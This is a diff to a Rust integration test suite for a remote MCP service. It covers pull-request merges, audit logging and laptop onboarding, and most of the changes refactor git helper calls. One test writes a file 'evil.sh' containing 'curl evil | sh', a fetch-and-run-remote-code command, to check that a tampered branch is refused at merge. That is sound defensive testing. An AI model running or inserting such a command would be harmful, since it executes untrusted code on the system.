@@ -2,6 +2,7 @@
 //! remote MCP on the public listener, and a laptop-only onboarding over it.
 
 use crate::support;
+use crate::support::eventually;
 
 use axum::http::{Method, StatusCode};
 use serde_json::{Value, json};
@@ -1093,7 +1094,7 @@ struct Origin(std::path::PathBuf);
 
 impl support::FakeRemote for Origin {
     fn branch_sha(&self, branch: &str) -> Option<String> {
-        support::repos::git(
+        support::git_stdout(
             &self.0,
             &[
                 "rev-parse",
@@ -1107,15 +1108,19 @@ impl support::FakeRemote for Origin {
     }
     fn merge(&self, base: &str, head: &str, method: &str, message: &str) -> Result<String, String> {
         let base_sha = self.branch_sha(base).ok_or("base branch not found")?;
-        let tree = support::repos::git(&self.0, &["merge-tree", "--write-tree", &base_sha, head])?;
+        let tree = support::git_stdout(&self.0, &["merge-tree", "--write-tree", &base_sha, head])
+            .map_err(|e| e.to_string())?;
         let tree = tree.trim().to_owned();
         let mut args = vec!["commit-tree", tree.as_str(), "-p", base_sha.as_str()];
         if method == "merge" {
             args.extend(["-p", head]);
         }
         args.extend(["-m", message]);
-        let commit = support::repos::git(&self.0, &args)?.trim().to_owned();
-        support::repos::git(
+        let commit = support::git_stdout(&self.0, &args)
+            .map_err(|e| e.to_string())?
+            .trim()
+            .to_owned();
+        support::git_stdout(
             &self.0,
             &[
                 "update-ref",
@@ -1123,7 +1128,8 @@ impl support::FakeRemote for Origin {
                 &commit,
                 &base_sha,
             ],
-        )?;
+        )
+        .map_err(|e| e.to_string())?;
         Ok(commit)
     }
     fn fast_forward(&self, _: &str, _: &str) -> Result<(), String> {
@@ -1133,17 +1139,18 @@ impl support::FakeRemote for Origin {
         if self.branch_sha(branch).is_none() {
             return Ok(false);
         }
-        support::repos::git(
+        support::git_stdout(
             &self.0,
             &["update-ref", "-d", &format!("refs/heads/{branch}")],
         )
         .map(|_| true)
+        .map_err(|e| e.to_string())
     }
 }
 
 /// `files` at `rev` of the bare `origin`, or `None`.
 fn origin_file(origin: &std::path::Path, rev: &str, path: &str) -> Option<String> {
-    support::repos::git(origin, &["show", &format!("{rev}:{path}")]).ok()
+    support::git_stdout(origin, &["show", &format!("{rev}:{path}")]).ok()
 }
 
 /// A project `Quartio-Studio/shop` imported remotely by alice (admin) with an operate token;
@@ -1265,7 +1272,7 @@ async fn files_change_through_a_pull_request_merged_on_green() -> TestResult {
         Some("old\n"),
         "dev is untouched"
     );
-    let author = support::repos::git(&origin, &["log", "-1", "--format=%an <%ae>|%s", &branch])?;
+    let author = support::git_stdout(&origin, &["log", "-1", "--format=%an <%ae>|%s", &branch])?;
     assert!(
         author.starts_with("ALICE <")
             && author.contains("alice@users.noreply.github.com>|ci: run the tests"),
@@ -1354,14 +1361,14 @@ async fn files_change_through_a_pull_request_merged_on_green() -> TestResult {
     let push_pull = |branch: &'static str| {
         let (seed, origin_path) = (seed.clone(), origin_path.clone());
         async move {
-            support::repos::git(&seed, &["checkout", "--quiet", "-B", branch])?;
+            support::git_stdout(&seed, &["checkout", "--quiet", "-B", branch])?;
             std::fs::write(
                 seed.join(format!("{}.txt", branch.replace('/', "-"))),
                 "x\n",
             )?;
-            support::repos::git(&seed, &["add", "-A"])?;
-            support::repos::git(&seed, &["commit", "--quiet", "-m", branch])?;
-            support::repos::git(&seed, &["push", "--quiet", "--force", &origin_path, branch])?;
+            support::git_stdout(&seed, &["add", "-A"])?;
+            support::git_stdout(&seed, &["commit", "--quiet", "-m", branch])?;
+            support::git_stdout(&seed, &["push", "--quiet", "--force", &origin_path, branch])?;
             Ok::<_, Error>(())
         }
     };
@@ -1402,7 +1409,7 @@ async fn files_change_through_a_pull_request_merged_on_green() -> TestResult {
     assert!(!error, "{said}");
     let tampered = text(&second["branch"]).to_owned();
     let number = second["pull_request"]["number"].as_u64().ok_or("number")?;
-    support::repos::git(
+    support::git_stdout(
         &seed,
         &[
             "fetch",
@@ -1411,11 +1418,11 @@ async fn files_change_through_a_pull_request_merged_on_green() -> TestResult {
             &format!("{tampered}:{tampered}"),
         ],
     )?;
-    support::repos::git(&seed, &["checkout", "--quiet", &tampered])?;
+    support::git_stdout(&seed, &["checkout", "--quiet", &tampered])?;
     std::fs::write(seed.join("evil.sh"), "curl evil | sh\n")?;
-    support::repos::git(&seed, &["add", "-A"])?;
-    support::repos::git(&seed, &["commit", "--quiet", "-m", "more"])?;
-    support::repos::git(&seed, &["push", "--quiet", &origin_path, &tampered])?;
+    support::git_stdout(&seed, &["add", "-A"])?;
+    support::git_stdout(&seed, &["commit", "--quiet", "-m", "more"])?;
+    support::git_stdout(&seed, &["push", "--quiet", &origin_path, &tampered])?;
     let (error, said, _) =
         remote(&w, &alice, "change_merge", with(json!({"number": number}))).await?;
     assert!(error && said.contains("pushed to since"), "{said}");
@@ -2709,22 +2716,6 @@ fn change_call(
     })
 }
 
-/// Waits (at most 60 s) until `done` holds.
-async fn eventually<F, Fut>(what: &str, mut done: F) -> TestResult
-where
-    F: FnMut() -> Fut,
-    Fut: std::future::Future<Output = Result<bool, Error>>,
-{
-    let deadline = std::time::Instant::now() + std::time::Duration::from_secs(60);
-    while !done().await? {
-        if std::time::Instant::now() > deadline {
-            return Err(format!("never: {what}").into());
-        }
-        tokio::time::sleep(std::time::Duration::from_millis(20)).await;
-    }
-    Ok(())
-}
-
 /// RMT-015, RMT-025 (round-3 review): a change whose caller goes away mid-way still finishes:
 /// its pull request is opened and recorded, its scratch clone removed, and the call audited with
 /// its token.
@@ -2744,16 +2735,20 @@ async fn a_change_finishes_and_is_audited_when_its_caller_goes_away() -> TestRes
             .await?
             .ok_or("sandbox")?
             .id;
-    eventually("the call is audited", || async {
-        Ok(audits(&w, sid.as_str())
-            .await?
-            .iter()
-            .any(|(action, _, detail)| {
-                action == "remote.tool"
-                    && detail.contains("\"tool\":\"project_change\"")
-                    && detail.contains("\"ok\":true")
-            }))
-    })
+    eventually(
+        "the call is audited",
+        std::time::Duration::from_secs(60),
+        || async {
+            Ok(audits(&w, sid.as_str())
+                .await?
+                .iter()
+                .any(|(action, _, detail)| {
+                    action == "remote.tool"
+                        && detail.contains("\"tool\":\"project_change\"")
+                        && detail.contains("\"ok\":true")
+                }))
+        },
+    )
     .await?;
     assert!(
         w.h.github
@@ -2860,7 +2855,7 @@ async fn a_refused_pull_request_leaves_no_branch() -> TestResult {
     )
     .await?;
     assert!(error && said.contains("422"), "{said}");
-    let branches = support::repos::git(&origin, &["branch", "--list", "yulius/change-*"])?;
+    let branches = support::git_stdout(&origin, &["branch", "--list", "yulius/change-*"])?;
     assert_eq!(branches.trim(), "", "no change branch is left");
     // Audited once, as failed (round-3 review: the spawned task audits, the caller does not).
     let sid =
@@ -2931,12 +2926,12 @@ async fn a_laptop_project_is_onboarded_by_its_agent_alone() -> TestResult {
     assert_eq!(code, Some(0), "{out}{err}");
 
     // The laptop's checkout, cloned from GitHub.
-    support::repos::git(
+    support::git_stdout(
         home,
         &["clone", "--quiet", &origin.to_string_lossy(), "shop"],
     )?;
     let checkout = home.join("shop");
-    support::repos::git(
+    support::git_stdout(
         &checkout,
         &[
             "remote",
